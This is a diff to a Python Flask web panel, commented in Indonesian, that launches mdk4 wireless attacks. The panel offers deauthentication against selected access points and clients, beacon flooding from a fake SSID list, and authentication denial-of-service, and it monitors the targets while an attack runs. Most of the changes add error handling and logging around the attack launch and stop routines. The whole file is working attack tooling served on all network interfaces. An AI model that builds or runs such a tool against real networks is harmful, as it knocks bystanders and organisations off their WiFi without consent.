@@ -10,6 +10,7 @@ import glob
 import threading
 import tempfile
 import json
+import traceback
 
 app = Flask(__name__)
 
@@ -28,6 +29,15 @@ monitor_data = {
     "packets_sent": 0,
     "last_update": None
 }
+
+# ====================== ERROR HANDLER ======================
+
+@app.errorhandler(Exception)
+def handle_exception(e):
+    """Global error handler untuk semua exception"""
+    print(f"[-] Unhandled exception: {e}")
+    traceback.print_exc()
+    return jsonify({"status": "error", "message": str(e)}), 500
 
 # ====================== FUNGSI MANAJEMEN INTERFACE ======================
 
@@ -227,6 +237,7 @@ def monitor_loop():
             
         except Exception as e:
             print(f"[-] Monitor error: {e}")
+            traceback.print_exc()
         
         time.sleep(3)  # Update setiap 3 detik
 
@@ -248,11 +259,16 @@ def stop_monitor_thread():
     """Stop monitoring thread"""
     global monitor_running, monitor_thread
     monitor_running = False
-    if monitor_thread:
-        monitor_thread.join(timeout=2)
-        monitor_thread = None
+    
+    if monitor_thread and monitor_thread.is_alive():
+        try:
+            monitor_thread.join(timeout=3)
+        except Exception as e:
+            print(f"[-] Error joining monitor thread: {e}")
+        finally:
+            monitor_thread = None
 
-# ====================== PARSE CSV ======================
+# ====================== PARSE CSV SCAN ======================
 
 def parse_csv_scan(filename):
     """Parse airodump-ng CSV output file untuk scan"""
@@ -330,6 +346,7 @@ def scan_wifi():
             
     except Exception as e:
         print(f"[-] Error during scan: {e}")
+        traceback.print_exc()
         return jsonify({"status": "error", "message": str(e)})
 
 # ====================== ROUTES MDK4 ======================
@@ -349,154 +366,196 @@ def get_interfaces():
             "monitor": monitor
         })
     except Exception as e:
+        print(f"[-] Error getting interfaces: {e}")
+        traceback.print_exc()
         return jsonify({"status": "error", "message": str(e)})
 
 @app.route('/monitor_data', methods=['GET'])
 def get_monitor_data():
     """Get real-time monitoring data"""
     global monitor_data
-    return jsonify({
-        "status": "success",
-        "data": monitor_data
-    })
+    try:
+        return jsonify({
+            "status": "success",
+            "data": monitor_data
+        })
+    except Exception as e:
+        print(f"[-] Error getting monitor data: {e}")
+        return jsonify({"status": "error", "message": str(e)})
 
 @app.route('/start_mdk4', methods=['POST'])
 def start_mdk4():
     global attack_process, attack_running, attack_type, current_targets
     
-    data = request.json
-    attack_type = data.get('type')
-    targets = data.get('targets', [])
-    interface = data.get('interface')
-    
-    if not interface:
-        return jsonify({"status": "error", "message": "No interface selected"})
-    
-    # Stop attack yang sedang berjalan
-    stop_attack()
-    
-    # Siapkan command berdasarkan tipe
-    cmd = None
-    warning_msg = None
-    
-    if attack_type == 'deauth':
-        if targets and len(targets) > 0:
-            target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
-            try:
-                for target in targets:
-                    target_file.write(f"{target['bssid']},{target['channel']}\n")
-                target_file.close()
+    try:
+        data = request.json
+        attack_type = data.get('type')
+        targets = data.get('targets', [])
+        interface = data.get('interface')
+        
+        if not interface:
+            return jsonify({"status": "error", "message": "No interface selected"})
+        
+        # Stop attack yang sedang berjalan
+        stop_attack()
+        
+        # Siapkan command berdasarkan tipe
+        cmd = None
+        warning_msg = None
+        
+        if attack_type == 'deauth':
+            if targets and len(targets) > 0:
+                target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
+                try:
+                    for target in targets:
+                        target_file.write(f"{target['bssid']},{target['channel']}\n")
+                    target_file.close()
+                    cmd = [
+                        "sudo", "mdk4", interface, "d",
+                        "-B", target_file.name,
+                        "-c", "h",
+                        "-s", "500"
+                    ]
+                    current_targets = targets
+                except Exception as e:
+                    return jsonify({"status": "error", "message": str(e)})
+            else:
                 cmd = [
                     "sudo", "mdk4", interface, "d",
-                    "-B", target_file.name,
                     "-c", "h",
                     "-s", "500"
                 ]
-                current_targets = targets
-            except Exception as e:
-                return jsonify({"status": "error", "message": str(e)})
-        else:
+                current_targets = []
+                
+        elif attack_type == 'beacon':
+            ssid_file = find_ssid_file()
+            if not ssid_file:
+                return jsonify({"status": "error", "message": "ssid_list.txt not found in ssid-fake folder"})
             cmd = [
-                "sudo", "mdk4", interface, "d",
-                "-c", "h",
+                "sudo", "mdk4", interface, "b",
+                "-f", ssid_file,
+                "-w", "a",
+                "-m",
                 "-s", "500"
             ]
             current_targets = []
             
-    elif attack_type == 'beacon':
-        ssid_file = find_ssid_file()
-        if not ssid_file:
-            return jsonify({"status": "error", "message": "ssid_list.txt not found in ssid-fake folder"})
-        cmd = [
-            "sudo", "mdk4", interface, "b",
-            "-f", ssid_file,
-            "-w", "a",
-            "-m",
-            "-s", "500"
-        ]
-        current_targets = []
+        elif attack_type == 'authdos':
+            if targets and len(targets) > 0:
+                target = targets[0]
+                if len(targets) > 1:
+                    warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
+                    print(f"[!] {warning_msg}")
+                    print(f"[!] {len(targets)-1} other target(s) ignored")
+                
+                cmd = [
+                    "sudo", "mdk4", interface, "a",
+                    "-a", target['bssid'],
+                    "-s", "1000"
+                ]
+                current_targets = [target]
+            else:
+                return jsonify({"status": "error", "message": "Auth DOS requires 1 target"})
         
-    elif attack_type == 'authdos':
-        if targets and len(targets) > 0:
-            target = targets[0]
-            if len(targets) > 1:
-                warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
-                print(f"[!] {warning_msg}")
-                print(f"[!] {len(targets)-1} other target(s) ignored")
+        if not cmd:
+            return jsonify({"status": "error", "message": "Invalid attack type"})
+        
+        try:
+            print(f"[*] Starting MDK4: {' '.join(cmd)}")
+            attack_process = subprocess.Popen(cmd, preexec_fn=os.setsid)
+            attack_running = True
             
-            cmd = [
-                "sudo", "mdk4", interface, "a",
-                "-a", target['bssid'],
-                "-s", "1000"
-            ]
-            current_targets = [target]
-        else:
-            return jsonify({"status": "error", "message": "Auth DOS requires 1 target"})
-    
-    if not cmd:
-        return jsonify({"status": "error", "message": "Invalid attack type"})
-    
-    try:
-        print(f"[*] Starting MDK4: {' '.join(cmd)}")
-        attack_process = subprocess.Popen(cmd, preexec_fn=os.setsid)
-        attack_running = True
-        
-        # Start monitoring thread
-        if current_targets:
-            start_monitor_thread()
-        
-        response = {
-            "status": "success",
-            "message": f"MDK4 {attack_type} started",
-            "type": attack_type,
-            "target_count": len(current_targets)
-        }
-        
-        if warning_msg:
-            response["warning"] = warning_msg
-            response["ignored"] = len(targets) - 1
-        
-        return jsonify(response)
-        
+            # Start monitoring thread
+            if current_targets:
+                start_monitor_thread()
+            
+            response = {
+                "status": "success",
+                "message": f"MDK4 {attack_type} started",
+                "type": attack_type,
+                "target_count": len(current_targets)
+            }
+            
+            if warning_msg:
+                response["warning"] = warning_msg
+                response["ignored"] = len(targets) - 1
+            
+            return jsonify(response)
+            
+        except Exception as e:
+            print(f"[-] Error starting MDK4: {e}")
+            traceback.print_exc()
+            return jsonify({"status": "error", "message": str(e)})
+            
     except Exception as e:
+        print(f"[-] Error in start_mdk4: {e}")
+        traceback.print_exc()
         return jsonify({"status": "error", "message": str(e)})
 
 @app.route('/stop_mdk4', methods=['POST'])
 def stop_mdk4():
-    stop_attack()
-    return jsonify({"status": "success", "message": "Attack stopped"})
+    try:
+        print("[*] Stop request received")
+        stop_attack()
+        print("[+] Attack stopped successfully")
+        return jsonify({"status": "success", "message": "Attack stopped"})
+    except Exception as e:
+        print(f"[-] Error stopping attack: {e}")
+        traceback.print_exc()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 def stop_attack():
-    global attack_process, attack_running
+    global attack_process, attack_running, monitor_data
+    
+    print("[*] Stopping attack...")
     attack_running = False
+    
+    # Stop monitoring thread FIRST
+    stop_monitor_thread()
+    
+    # Kill MDK4 process
     if attack_process:
         try:
             os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
             attack_process.wait(timeout=2)
-        except:
-            pass
-        attack_process = None
-    subprocess.run("sudo pkill -f mdk4", shell=True, check=False)
+            print("[+] MDK4 process killed")
+        except ProcessLookupError:
+            print("[!] Process already gone")
+        except Exception as e:
+            print(f"[-] Error killing process: {e}")
+        finally:
+            attack_process = None
     
-    # Stop monitoring
-    stop_monitor_thread()
-    global monitor_data
+    # Kill any remaining mdk4 processes
+    try:
+        subprocess.run("sudo pkill -f mdk4", shell=True, check=False)
+        print("[+] All MDK4 processes killed")
+    except Exception as e:
+        print(f"[-] Error killing mdk4: {e}")
+    
+    # Reset monitor data dengan aman
     monitor_data = {
         "clients": [],
         "ap_status": "unknown",
         "packets_sent": 0,
         "last_update": None
     }
+    
+    print("[+] Attack stopped complete")
 
 @app.route('/attack_status', methods=['GET'])
 def attack_status():
     global attack_running, attack_type, current_targets
-    return jsonify({
-        "running": attack_running,
-        "type": attack_type,
-        "targets": current_targets,
-        "target_count": len(current_targets)
-    })
+    try:
+        return jsonify({
+            "running": attack_running,
+            "type": attack_type,
+            "targets": current_targets,
+            "target_count": len(current_targets)
+        })
+    except Exception as e:
+        print(f"[-] Error getting attack status: {e}")
+        return jsonify({"status": "error", "message": str(e)})
 
 def find_ssid_file():
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -513,10 +572,13 @@ def find_ssid_file():
 
 def cleanup():
     print("\n[*] Cleaning up...")
-    stop_attack()
-    stop_monitor_thread()
-    if monitor_iface:
-        stop_monitor_mode(monitor_iface)
+    try:
+        stop_attack()
+        stop_monitor_thread()
+        if monitor_iface:
+            stop_monitor_mode(monitor_iface)
+    except Exception as e:
+        print(f"[-] Error during cleanup: {e}")
     print("[+] Cleanup complete.")
 
 def signal_handler(sig, frame):
@@ -537,5 +599,6 @@ if __name__ == '__main__':
         app.run(host='0.0.0.0', port=5000, debug=False)
     except Exception as e:
         print(f"[-] Fatal error: {e}")
+        traceback.print_exc()
         cleanup()
         sys.exit(1)
